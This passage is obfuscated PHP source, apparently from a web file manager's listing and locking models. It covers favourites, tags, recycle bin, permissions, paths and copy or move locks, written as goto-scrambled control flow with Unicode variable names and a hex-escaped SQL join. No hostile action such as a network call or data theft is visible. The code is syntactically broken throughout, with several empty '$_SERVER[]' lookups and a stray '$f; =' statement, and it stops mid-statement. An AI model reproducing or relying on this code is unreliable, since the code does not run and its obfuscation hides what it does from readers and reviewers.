$B̖ = $B̖ ? $B̖ : array(); $B̖ = array_filter(array_unique($B̖)); goto Aً; aţ: } public function pathInfoFilter(&$aٙ) { goto eǑ; eۖ: if (!$Dߦ) { goto DƉ; Bͥ뿫: $E̖ = array(); foreach ($Dߦ as $d) { if (in_array($d, $EѠ)) { continue; } $E̖[] = $d; } goto AʾӾ; C: $e = $a[394]; $EѠ = explode($a[47], $e); $Dߦ = explode($a[47], $Cɟ); goto Bͥ뿫; DƉ: $Cɟ = $a[391]; $Cɟ .= $a[392]; $Cɟ .= $a[393]; goto C; AʾӾ: } $aٙ[$a[75]] = $a[395] . $aٙ[$a[390]] . $a[396]; $aٙ[$a[29]] = $aٙ[$a[397]] == 1 ? $a[76] : $a[173]; goto FˏѲ; FˏѲ: $aٙ[$a[398]] = $this->typeName($aٙ[$a[398]]); if ($aٙ[$a[397]] != 1) { $aٙ[$a[167]] = $aٙ[$a[399]]; unset($aٙ[$a[399]]); } $Aʻ = $Dߦ; goto e; eǑ: $a =& $_SERVER[]; static $Dߦ = false; static $E̖ = false; goto eۖ; e: if (isset($aٙ[$a[400]]) && $aٙ[$a[400]][$a[401]] == -1) { $Aʻ = $E̖; } $aٙ = array_field_key($aٙ, $Aʻ); return $aٙ; goto b呻; b呻: } public function listUserFav() { goto e; Bұ: foreach ($a as &$fݗ) { $fݗ = array($Aܐ[406] => $fݗ[$Aܐ[388]], $Aܐ[407] => $fݗ[$Aܐ[28]], $Aܐ[408] => $fݗ[$Aܐ[75]], $Aܐ[409] => $fݗ[$Aܐ[29]], $Aܐ[410] => $fݗ[$Aܐ[192]], $Aܐ[411] => $fݗ[$Aܐ[83]]); if ($fݗ[$Aܐ[29]] == $Aܐ[403] && $a[$fݗ[$Aܐ[75]]]) { $fݗ[$Aܐ[84]] = $a[$fݗ[$Aܐ[75]]]; } } unset($fݗ); return $a; goto f֥; e: $Aܐ =& $_SERVER[]; $a = Model($Aܐ[402])->listData(); $Cߴ = array_filter_by_field($a, $Aܐ[29], $Aܐ[403]); goto Eט; Eט: $Cߴ = array_to_keyvalue($Cߴ, $Aܐ[33], $Aܐ[75]); if ($Cߴ) { $a = $this->listSource(array($Aܐ[404] => array($Aܐ[405], $Cߴ))); } $a = array_to_keyvalue($a[$Aܐ[365]], $Aܐ[390]); goto Bұ; f֥: } public function listUserTag($CВ) { goto dʍ˿; dʍ˿: $DŇ =& $_SERVER[]; if ($CВ && !is_array($CВ)) { $CВ = array($CВ); } $E = Model($DŇ[412])->listData(); goto D㷹; F: if (!$e || count($EՆ) == $e[$DŇ[362]][$DŇ[363]]) { return $e; } $A = array(); $E = array_to_keyvalue($e[$DŇ[74]], $DŇ[33], $DŇ[390]); goto bݡݬ; e: foreach ($d« as $FⳲ => $B) { $e׍ = !0; if (!$CВ) { $EՆ[] = $FⳲ; continue; } foreach ($CВ as $a) { if (!in_array($a, $B)) { $e׍ = !1; break; } } if ($e׍) { $EՆ[] = $FⳲ; } } if (!$EՆ) { return array(); } $e = $this->listSource(array($DŇ[404] => array($DŇ[405], $EՆ))); goto F; D㷹: $d« = array(); foreach ($E as $bбĺ) { $AԂ = $bбĺ[$DŇ[75]]; if (!$AԂ) { continue; } if (!isset($d«[$AԂ])) { $d«[$AԂ] = array(); } $d«[$AԂ][] = $bбĺ[$DŇ[413]]; } $EՆ = array(); goto e; bݡݬ: $f; = array_to_keyvalue($e[$DŇ[73]], $DŇ[33], $DŇ[390]); $Cȭ־ = array_merge($f;, $E); foreach ($EՆ as $AԂ) { if (!in_array($AԂ, $Cȭ־)) { $A[] = $AԂ; } } goto dٚ; dٚ: if ($A) { Model($DŇ[414])->removeBySource($A); } return $e; goto Dʿ; Dʿ: } public function listUserRecycle() { $Eۆ =& $_SERVER[]; $Dқ = Model($Eۆ[415])->listData(); if (!$Dқ) { return array(); } $B = array($Eۆ[404] => array($Eۆ[405], $Dқ), $Eۆ[416] => 1); return $this->listSource($B); } public function listSource($a⏰, $D = 3000) { goto C˲; ḑ: $C = $this->field($d)->_makeOrder()->where($a⏰)->selectPage($D); $this->_listDataApply($C[$C٫ʄ؛[365]]); $this->_listMake($C); goto e; e: return $C; goto fނ; C˲: $C٫ʄ؛ =& $_SERVER[]; if (!isset($a⏰[$C٫ʄ؛[417]])) { $a⏰[$C٫ʄ؛[417]] = 0; } $d = $C٫ʄ؛[418]; goto ḑ; fނ: } protected function _makeOrder() { goto Dԙ; A肙͞: $aȎ = Input::get($bݑ[430], $bݑ[7], $fۏ, array_keys($DŴ)); if (!in_array($cᕰ, array_keys($F))) { $cᕰ = $bݑ[28]; } if (!in_array($aȎ, array_keys($DŴ))) { $cᕰ = $bݑ[422]; } goto F; Dԙ: $bݑ =& $_SERVER[]; $Eƃ = Model($bݑ[419])->get($bݑ[420]); $fۏ = Model($bݑ[419])->get($bݑ[421]); goto b; b: $DŴ = array($bݑ[422] => $bݑ[423], $bݑ[424] => $bݑ[425]); $F = array($bݑ[28] => $bݑ[28], $bݑ[77] => $bݑ[77], $bݑ[167] => $bݑ[399], $bݑ[426] => $bݑ[426], $bݑ[427] => $bݑ[428], $bݑ[192] => $bݑ[192], $bݑ[83] => $bݑ[83]); $cᕰ = Input::get($bݑ[429], $bݑ[7], $Eƃ, array_keys($F)); goto A肙͞; F: if ($cᕰ == $bݑ[28]) { } $c = $bݑ[431] . $F[$cᕰ] . $bݑ[50] . $DŴ[$aȎ]; return $this->order(rtrim(trim($c), $bݑ[47])); goto E; E: } protected function _listDataApplyItem($cʄ, $C، = false) { $dƾة = array($cʄ); $this->_listDataApply($dƾة, $C،); return $dƾة[0]; } protected function _listDataApply(&$f݄, $b춷љ = false) { goto b񷍒֎; D뺎: $this->_listAppendPath($f݄); $this->_listAppendAuth($f݄); $this->_listAppendSourceInfo($f݄, $cѪ؈); goto e̓; b񷍒֎: $Aȅ =& $_SERVER[]; if (!$f݄) { $f݄ = array(); return; } $cѪ؈ = array_to_keyvalue($f݄, $Aȅ[33], $Aȅ[390]); goto A; e̓: $this->_listAppendUser($f݄); $this->_listFilterInfo($f݄, $b춷љ); goto a; A: $cѪ؈ = array_unique($cѪ؈); $this->_listSourceCache($f݄); if (!$b춷љ) { $this->_listAppendMeta($f݄, $cѪ؈); $this->_listAppendFileMeta($f݄, $cѪ؈); $this->_listAppendChildren($f݄, $cѪ؈); } goto D뺎; a: } protected function _listSourceCache($cٵ) { $b螛 =& $_SERVER[]; foreach ($cٵ as $fή) { self::$cacheSourceInfo[$b螛[432] . $fή[$b螛[390]]] = $fή; } } protected function _listFilterInfo(&$AΌ, $b܇֙ = false) { $dА܋ =& $_SERVER[]; foreach ($AΌ as &$bԅ) { $bԅ = $this->pathInfoFilter($bԅ); self::$cachePathInfo[$dА܋[433] . intval($b܇֙) . $dА܋[434] . $bԅ[$dА܋[390]]] = $bԅ; } unset($bԅ); } protected function _listMake(&$eÝ) { $D =& $_SERVER[]; $eÝ[$D[74]] = array(); $eÝ[$D[73]] = array(); foreach ($eÝ[$D[365]] as $fܾ) { $F҆鮅 = $fܾ[$D[397]] == 1 ? $D[74] : $D[73]; $eÝ[$F҆鮅][] = $fܾ; } unset($eÝ[$D[365]]); } protected function _listAppendMeta(&$f, $cȲ) { goto f; f: $Aݱ㡱 =& $_SERVER[]; $dߨ = array($Aݱ㡱[404] => array($Aݱ㡱[405], $cȲ)); $A = Model($Aݱ㡱[435])->field($Aݱ㡱[436])->where($dߨ)->select(); goto Bب; Bب: if (!$A) { return; } $F¨ = array($Aݱ㡱[437], $Aݱ㡱[438]); $E = array(); goto B񅆛; B񅆛: foreach ($A as $aֶ) { if (!isset($E[$aֶ[$Aݱ㡱[390]]])) { $E[$aֶ[$Aݱ㡱[390]]] = array(); } if (in_array($aֶ[$Aݱ㡱[92]], $F¨)) { continue; } $E[$aֶ[$Aݱ㡱[390]]][$aֶ[$Aݱ㡱[92]]] = $aֶ[$Aݱ㡱[370]]; } foreach ($f as &$aݮ) { $aݮ[$Aݱ㡱[439]] = !1; if (isset($E[$aݮ[$Aݱ㡱[390]]])) { $aݮ[$Aݱ㡱[439]] = $E[$aݮ[$Aݱ㡱[390]]]; } if ($this->fileIsLock($aݮ) && $aݮ[$Aݱ㡱[400]]) { $Dި㽥 = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $aݮ[$Aݱ㡱[400]][$Aݱ㡱[401]] = AuthModel::authDisable($aݮ[$Aݱ㡱[400]][$Aݱ㡱[401]], $Dި㽥); $aݮ[$Aݱ㡱[400]][$Aݱ㡱[440]][$Aݱ㡱[400]] = $aݮ[$Aݱ㡱[400]][$Aݱ㡱[401]]; } } unset($aݮ); goto a; a: } protected function _listAppendFileMeta(&$Eݸܯ, $bǐ) { goto EϜ; Fͪύ: $Cʗ = $Cʗ ? $Cʗ : array(); $cĶ = array(); foreach ($Cʗ as $cй) { if (!isset($cĶ[$cй[$cĎ[441]]])) { $cĶ[$cй[$cĎ[441]]] = array(); } $cĶ[$cй[$cĎ[441]]][$cй[$cĎ[92]]] = $cй[$cĎ[370]]; } goto Eޜ; EϜ: $cĎ =& $_SERVER[]; $eϾ = array_to_keyvalue($Eݸܯ, $cĎ[33], $cĎ[441]); $eϾ = array_filter(array_unique($eϾ)); goto AЈ; Eޜ: foreach ($Eݸܯ as &$A܈) { goto d졵ћ; B: $Fтι[$cĎ[77]] = $A܈[$cĎ[77]]; $Fтι[$cĎ[28]] = $A܈[$cĎ[28]]; if (!isset(self::$cacheFileInfo[$cĎ[447] . $B])) { self::$cacheFileInfo[$cĎ[447] . $B] = array_merge(array(), $Fтι); } goto cǔퟎ; cǔퟎ: unset($Cﾹ[$B][$cĎ[75]]); $d = is_array($cĶ[$B]) ? $cĶ[$B] : array(); $A܈[$cĎ[163]] = array_merge($d, $Cﾹ[$B]); goto Fň; Fň: if (isset($A܈[$cĎ[163]][$cĎ[162]])) { $A܈[$cĎ[162]] = json_decode($A܈[$cĎ[163]][$cĎ[162]], !0); unset($A܈[$cĎ[163]][$cĎ[162]]); } goto FϸӚ; d졵ћ: $B = $A܈[$cĎ[441]]; if (!$B || !isset($Cﾹ[$B])) { continue; } $Fтι = $Cﾹ[$B]; goto B; FϸӚ: } unset($A܈); goto aх; AЈ: if (!$eϾ) { return; } $dŪ = array($cĎ[442] => array($cĎ[405], $eϾ)); $D = $cĎ[443]; goto AŅ; AŅ: $Cﾹ = Model($cĎ[444])->field($D)->where($dŪ)->select(); $Cﾹ = array_to_keyvalue($Cﾹ, $cĎ[441]); $Cʗ = Model($cĎ[445])->field($cĎ[446])->where($dŪ)->select(); goto Fͪύ; aх: } protected function _listAppendSourceInfo(&$AԈ, $A̾) { goto fㄙߗ; C҅΍: $D = array_to_keyvalue_group($dԏ, $Eǜ[390]); foreach ($AԈ as &$cڑ) { $cڑ[$Eǜ[84]] = array($Eǜ[451] => 0, $Eǜ[452] => 0, $Eǜ[453] => 0); if (isset($aܣ[$cڑ[$Eǜ[390]]])) { $cڑ[$Eǜ[84]][$Eǜ[454]] = 1; $cڑ[$Eǜ[84]][$Eǜ[455]] = $aܣ[$cڑ[$Eǜ[390]]][$Eǜ[28]]; } if (isset($FΚ[$cڑ[$Eǜ[390]]])) { $cڑ[$Eǜ[84]][$Eǜ[456]] = array(); foreach ($FΚ[$cڑ[$Eǜ[390]]] as $c皂˻) { $c = $D˺[$c皂˻]; $cڑ[$Eǜ[84]][$Eǜ[456]][] = array($Eǜ[457] => $c[$Eǜ[388]], $Eǜ[407] => $c[$Eǜ[28]], $Eǜ[458] => $c[$Eǜ[459]]); } } if (isset($D[$cڑ[$Eǜ[390]]])) { $cڑ[$Eǜ[84]][$Eǜ[460]] = array(); foreach ($D[$cڑ[$Eǜ[390]]] as $dʻ) { $cڑ[$Eǜ[84]][$Eǜ[460]] = array($Eǜ[461] => $dʻ[$Eǜ[462]], $Eǜ[463] => $dʻ[$Eǜ[464]], $Eǜ[465] => $dʻ[$Eǜ[390]], $Eǜ[466] => $dʻ[$Eǜ[467]], $Eǜ[468] => $dʻ[$Eǜ[469]], $Eǜ[470] => $dʻ[$Eǜ[470]], $Eǜ[471] => $dʻ[$Eǜ[471]]); } } } unset($cڑ); goto Fۿ; fㄙߗ: $Eǜ =& $_SERVER[]; if (!defined($Eǜ[448])) { return; } $FӅ = Model($Eǜ[449])->listData(); goto eҡꙫ; Fۿ: return $AԈ; goto Dֶ; eҡꙫ: $C҂ = Model($Eǜ[412])->listData(); $Eك = Model($Eǜ[402])->listData(); $dԏ = Model($Eǜ[450])->listSimple(); goto a; a: $D˺ = array_to_keyvalue($FӅ, $Eǜ[388]); $FΚ = array_to_keyvalue_group($C҂, $Eǜ[75], $Eǜ[413]); $aܣ = array_to_keyvalue($Eك, $Eǜ[75]); goto C҅΍; Dֶ: } protected function _listAppendChildren(&$c, $eل) { goto b; A䳝: $aàݩ = array($d˝[472] => array($d˝[7], $a)); $EЕ = array($d˝[472], $d˝[397], $d˝[473] => $d˝[474]); $dӊ = $this->field($EЕ)->where($aàݩ)->group($d˝[475])->select(); goto c; Eʹ: foreach ($c as &$a϶) { if (!$a϶[$d˝[397]]) { continue; } $a[] = $a϶[$d˝[390]]; } unset($a϶); if (!$a) { return; } goto A䳝; b: $d˝ =& $_SERVER[]; $a = array(); $E͕ = array($d˝[201] => 0, $d˝[202] => 0); goto Eʹ; c: $b = array(); foreach ($dӊ as $aʿ) { $A憶 = $aʿ[$d˝[472]]; $Aꨟ = $aʿ[$d˝[397]] == $d˝[86] ? $d˝[202] : $d˝[201]; if (!isset($b[$A憶])) { $b[$A憶] = array($d˝[201] => 0, $d˝[202] => 0); } $b[$A憶][$Aꨟ] += $aʿ[$d˝[474]]; } foreach ($c as &$a϶) { if (!$a϶[$d˝[397]]) { continue; } $fȘ = is_array($b[$a϶[$d˝[390]]]) ? $b[$a϶[$d˝[390]]] : $E͕; $a϶[$d˝[202]] = $fȘ[$d˝[202]]; $a϶[$d˝[201]] = $fȘ[$d˝[201]]; unset($a϶[$d˝[399]]); } goto f赳; f赳: unset($a϶); goto dӂ; dӂ: } protected function _listAppendAuth(&$E͉) { goto aɈ; aɈ: $Eږ =& $_SERVER[]; if (!defined($Eږ[448])) { return; } $C = array(); goto D; fŅ: $aŬ׾ = Model($Eږ[476])->getSourceList($C, $C); foreach ($E͉ as $Aۥ => &$eӓ) { $eӓ[$Eږ[400]] = $aŬ׾[$eӓ[$Eږ[390]]]; if (!$eӓ[$Eږ[400]] && $eӓ[$Eږ[398]] == self::TYPE_GROUP) { $eӓ[$Eږ[400]] = Action($Eږ[477])->pathGroupAuthMake($eӓ[$Eږ[478]]); if (!$eӓ[$Eږ[400]] && !_get($GLOBALS, $Eږ[479])) { $eӓ[$Eږ[194]] = !1; $eӓ[$Eږ[193]] = !1; } } if ($eӓ[$Eږ[400]]) { $eӓ[$Eږ[194]] = AuthModel::authCheckEdit($eӓ[$Eږ[400]][$Eږ[401]]); $eӓ[$Eږ[193]] = AuthModel::authCheckView($eӓ[$Eږ[400]][$Eږ[401]]); } $this->groupPathDisplay($eӓ); } unset($eӓ); goto D; D: foreach ($E͉ as $eӓ) { if ($eӓ[$Eږ[398]] == self::TYPE_GROUP) { $C[] = $eӓ[$Eږ[390]]; } } if (!$C) { return; } $C = array_to_keyvalue($E͉, $Eږ[390]); goto fŅ; D: } public function groupPathDisplay(&$Eޑ) { goto bɸ; bɸ: $e =& $_SERVER[]; if ($Eޑ[$e[398]] != self::TYPE_GROUP) { return; } $C = Model($e[480])->getInfo($Eޑ[$e[478]]); goto A; A: $bߋ = $this->parentLevelArray($C[$e[481]]); $fŏ = $e[33]; foreach ($bߋ as $b囘) { $Aഘĳ = Model($e[480])->getInfo($b囘); $fŏ .= $Aഘĳ[$e[84]][$e[390]] . $e[47]; } goto dܐЄ; dܐЄ: $Eޑ[$e[482]] = $C[$e[472]]; $Eޑ[$e[483]] = $C[$e[481]]; $Eޑ[$e[484]] = $C[$e[485]]; goto eǍ; eǍ: $Eޑ[$e[486]] = $fŏ . $C[$e[84]][$e[390]]; goto bܪǨ; bܪǨ: } protected function _listAppendPath(&$f㵆) { goto dú; dú: $e =& $_SERVER[]; static $B = array(); $B΋ = array(); goto e; e: $A = array(); foreach ($f㵆 as &$E®) { $Cڿ = $E®[$e[397]] == $e[86]; if ($Cڿ) { $B[$E®[$e[390]]] = $E®[$e[28]]; } if (isset($A[$E®[$e[481]]])) { continue; } $A[$E®[$e[481]]] = !0; $f = $this->parentLevelArray($E®[$e[481]]); foreach ($f as $dޅ => $A׶) { if ($dޅ != 0 && !isset($B[$A׶])) { $B΋[] = $A׶; } } } unset($E®); goto D⮃ӿ; B: unset($E®); return $f㵆; goto dӊѠ; Bƕ: $f = array(); $fֱ = array(); foreach ($f㵆 as &$E®) { goto d; dÊާ: $E®[$e[489]] = str_replace($e[490], $e[8], $c¯); $cס = trim($E®[$e[489]], $e[8]); if ($E®[$e[472]] == $e[491] && $cס) { $E®[$e[28]] = $cס; } goto e˥; d: $A媉 = $E®[$e[481]]; if (isset($fֱ[$A媉])) { $c¯ = $f[$A媉]; } else { $f = $this->parentLevelArray($E®[$e[481]]); $fϛ = $e[488] . $E®[$e[398]] . $e[434] . $E®[$e[478]]; if ($f[$fϛ]) { $c¯ = $f[$fϛ]; } else { $c¯ = $this->_listAppendPathRoot($E®, $f); $f[$fϛ] = $c¯; } foreach ($f as $dޅ => $A׶) { if ($dޅ == 0 && $c¯ && $E®[$e[398]] == self::TYPE_GROUP) { continue; } if (isset($B[$A׶])) { $c¯ .= $B[$A׶] . $e[8]; } } if ($f) { $c¯ .= $E®[$e[28]]; } $f[$A媉] = $c¯; } if ($E®[$e[397]]) { $c¯ .= $e[8]; } goto dÊާ; e˥: if (intval($E®[$e[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($E®, $f, $aˮ); } goto A; A: } goto B; D⮃ӿ: $B΋ = array_unique($B΋); if (count($B΋) > 0) { $d = array($e[404] => array($e[405], $B΋)); if (count($B΋) == 1) { $Bؘż = $this->sourceInfo($B΋[0]); $b = is_array($Bؘż) ? array($Bؘż) : !1; } else { $b = $this->field($e[487])->where($d)->select(); } if (!$b) { $b = array(); } foreach ($b as $bϜ͠⽃) { $B[$bϜ͠⽃[$e[390]]] = $bϜ͠⽃[$e[28]]; } } $aˮ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto Bƕ; dӊѠ: } private function _listAppendPathRecycle(&$fϙ, $e⇵, $bП) { goto F썊; bσ: if ($fϙ[$Eؕ򊃓[390]] == $bП) { $fϙ[$Eؕ򊃓[481]] = $Eؕ򊃓[493]; $fϙ[$Eؕ򊃓[472]] = $Eؕ򊃓[491]; $fϙ[$Eؕ򊃓[28]] = LNG($Eؕ򊃓[492]); } $fϙ[$Eؕ򊃓[494]] = $Eؕ򊃓[495]; goto e͛; bᾋ: $f = implode($Eؕ򊃓[8], array_slice($D, 2)); $fϙ[$Eؕ򊃓[489]] = $Eؕ򊃓[8] . LNG($Eؕ򊃓[492]) . $Eؕ򊃓[8] . ltrim($f, $Eؕ򊃓[8]); $fϙ[$Eؕ򊃓[481]] = $Eؕ򊃓[493] . implode($Eؕ򊃓[47], array_slice($e⇵, 1)) . $Eؕ򊃓[47]; goto bσ; F썊: $Eؕ򊃓 =& $_SERVER[]; if (!in_array($bП, $e⇵) && $fϙ[$Eؕ򊃓[390]] != $bП) { return; } $D = explode($Eؕ򊃓[8], trim($fϙ[$Eؕ򊃓[489]], $Eؕ򊃓[8])); goto bᾋ; e͛: } protected function _listAppendPathRoot(&$fݵ, $A) { $b =& $_SERVER[]; $Bף = $b[33]; if ($fݵ[$b[398]] == self::TYPE_USER) { if (defined($b[448]) && $fݵ[$b[478]] == USER_ID) { $Bף = LNG($b[496]); if (!$A) { $fݵ[$b[28]] = $Bף; } } else { $b§匿 = Model($b[497])->getInfoSimple($fݵ[$b[478]]); $Bף = LNG($b[498]) . $b[159] . $b§匿[$b[28]] . $b[499]; } } else { if ($fݵ[$b[398]] == self::TYPE_GROUP) { $b§匿 = Model($b[480])->getInfoSimple($fݵ[$b[478]]); $Bף = $b§匿[$b[28]]; } else { if ($fݵ[$b[398]] == self::TYPE_SYSTEM) { $Bף = $b[500]; } } } $Bף = $Bף ? $b[8] . $Bף . $b[8] : $b[8]; return $Bף; } protected function _listAppendUser(&$B٣) { goto Fゥ; Fٹ: unset($f씲); goto cƘ; Fゥ: $e =& $_SERVER[]; $E = array_to_keyvalue($B٣, $e[33], $e[426]); $aÏ = array_to_keyvalue($B٣, $e[33], $e[428]); goto CېŦ; CېŦ: $bǢ = array_merge($E, $aÏ); $B﯂ = Model($e[501])->userListInfo($bǢ); foreach ($B٣ as &$f씲) { $FՔꌥ = $f씲[$e[426]]; $f씲[$e[426]] = $B﯂[$FՔꌥ] ? $B﯂[$FՔꌥ] : !1; $FՔꌥ = $f씲[$e[428]]; $f씲[$e[428]] = $B﯂[$FՔꌥ] ? $B﯂[$FՔꌥ] : !1; if (isset($f씲[$e[439]]) && $f씲[$e[439]][$e[502]]) { $aŗٙ = $GLOBALS[$e[6]][$e[87]][$e[503]]; if ($f씲[$e[439]][$e[504]] <= time() - $aŗٙ) { $this->metaSet($f씲[$e[390]], $e[502], null); $this->metaSet($f씲[$e[390]], $e[504], null); unset($f씲[$e[439]][$e[502]]); continue; } $a = $f씲[$e[439]][$e[502]]; $f씲[$e[439]][$e[505]] = Model($e[501])->getInfoSimpleOuter($a); } } goto Fٹ; cƘ: } public function parentLevelArray($fꔹ) { $A䍴 =& $_SERVER[]; $fꔹ = explode($A䍴[47], trim($fꔹ, $A䍴[47])); return array_remove_value($fꔹ, $A䍴[491]); } public function listAll($aމȴ) { goto e蓩; e蓩: $cس =& $_SERVER[]; $D = $this->sourceInfo($aމȴ); $A۞ = array($cس[506] => array($cس[507], $D[$cس[481]] . $aމȴ . $cس[508]), $cس[509] => 0); goto bΈƳ; bΈƳ: $E× = $cس[510]; $C = "\x4c\105\106\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\x69\157\137\146\151\x6c\x65\x20\146\x69\x6c\x65\40\x6f\x6e\x20\x73\157\x75\x72\x63\x65\56\146\151\154\145\111\x44\x20\x3d\40\x66\151\x6c\145\56\x66\151\x6c\145\x49\104"; $C = $this->alias($cس[511])->field($E×)->where($A۞)->join($C)->select(); goto aޥ; DƑ: $d֋ = array(); foreach ($C as $B => $b) { goto E; E: $Eб = $this->parentLevelArray($b[$cس[481]]); array_shift($Eб); $eΗ = $f壨; goto e޳; aȏ: $eΗ = str_replace($cس[490], $cس[8], $eΗ); $eΗ = str_replace($cس[490], $cس[8], $eΗ); $f߶ = array($cس[408] => str_replace($cس[490], $cس[8], $eΗ), $cس[512] => intval($b[$cس[397]]), $cس[84] => $this->pathInfoFilter($b)); goto A擌ε; e޳: for ($C = 0; $C < count($Eб); $C++) { $eΗ .= $C[$Eб[$C]][$cس[28]] . $cس[8]; } $eΗ .= $b[$cس[28]]; if ($b[$cس[397]]) { $eΗ .= $cس[8]; } goto aȏ; A擌ε: if (!$b[$cس[397]]) { $f߶[$cس[441]] = $b[$cس[441]]; $f߶[$cس[85]] = $b[$cس[75]]; } $d֋[] = $f߶; goto f; f: } return $d֋; goto f櫪; CѲ: $C = array_to_keyvalue($C, $cس[390]); $f壨 = "\x2f{$D[$cس[28]]}\57"; $f壨 = $f壨 == $cس[490] ? $cس[8] : $f壨; goto DƑ; aޥ: $this->_listAppendAuth($C); $this->_listAppendUser($C); $this->_listAppendPath($C); goto CѲ; f櫪: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($B) { goto f㌥Ճ; Fϣɶ: $this->_lockEvent($B, array($Aİ[516], $Aİ[517]), $eǳڦ); $this->_lockCheckEnd($Aİ[513], $B); goto b˃; b: $eǳڦ = 1; $this->_lockEvent($B, array($Aİ[514], $Aİ[515]), $eǳڦ); $this->_lockParent($B, array($Aİ[515]), $eǳڦ); goto Fϣɶ; f㌥Ճ: $Aİ =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($Aİ[513], $B); goto b; b˃: } public function lockCopyEnd($EՉ) { $eɔŠ =& $_SERVER[]; if (!$this->allowLock()) { return; } $bЬ = 0; $this->_lockEvent($EՉ, array($eɔŠ[514], $eɔŠ[515]), $bЬ); $this->_lockParent($EՉ, array($eɔŠ[515]), $bЬ); $this->_lockEvent($EՉ, array($eɔŠ[516], $eɔŠ[517]), $bЬ); } public function lockWriteStart($dߖ, $bÑ = '') { goto F; F: $A =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($A[514], $dߖ); goto dӢ; dӢ: $aԊʬ = 1; $this->_lockKey($A[518] . $dߖ . $A[94] . $bÑ, $aԊʬ); $this->_lockEvent($dߖ, array($A[513], $A[515]), $aԊʬ); goto bᛝ; bᛝ: $this->_lockParent($dߖ, array($A[513], $A[515]), $aԊʬ); $this->_lockCheckEnd($A[514], $dߖ); goto Eȅ; Eȅ: } public function lockWriteEnd($Fސ, $cۜ = '') { $dč =& $_SERVER[]; if (!$this->allowLock()) { return; } $C = 0; $this->_lockKey($dč[518] . $Fސ . $dč[94] . $cۜ, $C); $this->_lockEvent($Fސ, array($dč[513], $dč[515]), $C); $this->_lockParent($Fސ, array($dč[513], $dč[515]), $C); } public function lockMoveStart($fՐɆ) { goto E; EЛД: $eԑ = 1; $this->_lockKey($A[519] . $fՐɆ, $eԑ); $this->_lockEvent($fՐɆ, array($A[513], $A[514]), $eԑ); goto dНТ; E: $A =& $_SERVER[]; if (!$this->allowLock()) { return; } $this->_lockCheck($A[515], $fՐɆ); goto EЛД; dНТ: $this->_lockParent($fՐɆ, array($A[513], $A[515]), $eԑ); $this->_lockEvent($fՐɆ, array($A[520], $A[516], $A[517]), $eԑ); $this->_lockCheckEnd($A[515], $fՐɆ); goto Fϻɐ; Fϻɐ: } public function lockMoveEnd($Bß) { goto A; B߿: $this->_lockKey($Dп[519] . $Bß, $d֯); $this->_lockEvent($Bß, array($Dп[513], $Dп[514]), $d֯); $this->_lockParent($Bß, array($Dп[513], $Dп[515]), $d֯); goto B; A: $Dп =& $_SERVER[]; if (!$this->allowLock()) { return; } $d֯ = 0; goto B߿; B: $this->_lockEvent($Bß, array($Dп[520], $Dп[516], $Dп[517]), $d֯); goto eㄖФ; eㄖФ: } private function _lockCheck($BŴν, $B) { goto fޟ; D: $this->_lockTimeStart[$Cτ] = timeFloat(); if (!is_array($D)) { return; } $b톖Δ = LNG($D[521]); goto eذ; eذ: CacheLock::setErrorMsg($D[159] . htmlspecialchars($D[$D[28]]) . $D[499] . $b톖Δ); $this->_lockKey($Cτ, 1); $this->_lockKey($Cτ, 0); goto D֐; fޟ: $D =& $_SERVER[]; $D = $this->sourceInfo($B); $Cτ = $BŴν . $D[94] . $B; goto D; D֐: $dƵ = array_reverse($this->parentLevelArray($D[$D[481]])); foreach ($dƵ as $dܬ) { $Cτ = $BŴν . $D[522] . $dܬ; if (CacheLock::lockGet($D[523] . $Cτ)) { $D = $this->sourceInfo($dܬ); CacheLock::setErrorMsg($D[159] . htmlspecialchars($D[$D[28]]) . $D[499] . $b톖Δ); $this->_lockKey($Cτ, 1); $this->_lockKey($Cτ, 0); } } goto E; E: } private function _lockCheckEnd($a㮠, $f) { goto bŲ; bŲ: $aవ =& $_SERVER[]; $C֦팃 = $a㮠 . $aవ[94] . $f; CacheLock::setErrorMsg($aవ[373]); goto Aꓩ; Eۚ: if ($BЏ > 0.5) { unset(self::$cacheSourceInfo[$aవ[432] . $f]); } $Aɶ = $this->sourceInfo($f); if (!$Aɶ) { show_json(LNG($aవ[104]), !1); } goto a܂󑘟; Aꓩ: if (!isset($this->_lockTimeStart[$C֦팃])) { return; } $BЏ = timeFloat() - $this->_lockTimeStart[$C֦팃]; unset($this->_lockTimeStart[$C֦팃]); goto Eۚ; a܂󑘟: } private function _lockParent($cע, $Cɱۓ, $CĘ) { if (!$this->autoLockSet) { return; } $b = $this->sourceInfo($cע); if (!is_array($b)) { return; } $CԨՍ = array_reverse($this->parentLevelArray($b[$_SERVER[][481]])); foreach ($CԨՍ as $C) { $this->_lockEvent($C, $Cɱۓ, $CĘ); } } private function _lockEvent($cʐ, $b嗆˰, $C) { $cҍ =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($b嗆˰ as $cۿ) { $fԻʸ = $cۿ . $cҍ[94] . $cʐ; if ($C && CacheLock::lockGet($cҍ[523] . $fԻʸ)) { continue; } $this->_lockKey($fԻʸ, $C); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bΕ, $fҕ = 1) { $Cߙ = $_SERVER[][523] . md5($bΕ); if ($fҕ) { if (isset(self::$_lockItemArr[$Cߙ])) { return; } self::$_lockItemArr[$Cߙ] = 1; CacheLock::lock($Cߙ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Cߙ])) { return; } unset(self::$_lockItemArr[$Cߙ]); CacheLock::unlock($Cߙ); } } public function isParentOf($C, $Fӈ蘩) { goto Dƭ; bֈ򷸴: $C蟖 = $f[$c۫[481]] . $f[$c۫[390]] . $c۫[47]; $Bɏ = $B߂[$c۫[481]] . $B߂[$c۫[390]] . $c۫[47]; $f攙 = strpos($Bɏ, $C蟖) === 0; goto C; Dƭ: $c۫ =& $_SERVER[]; $f = $this->sourceInfo($C); $B߂ = $this->sourceInfo($Fӈ蘩); goto bֈ򷸴; C: return $f攙; goto FȄ; FȄ: } private $targetIsDelete = 0; public function copy($Bܱ, $e, $eڮ = REPEAT_REPLACE, $c = '') { goto fÊՙ; fÊՙ: $aâ =& 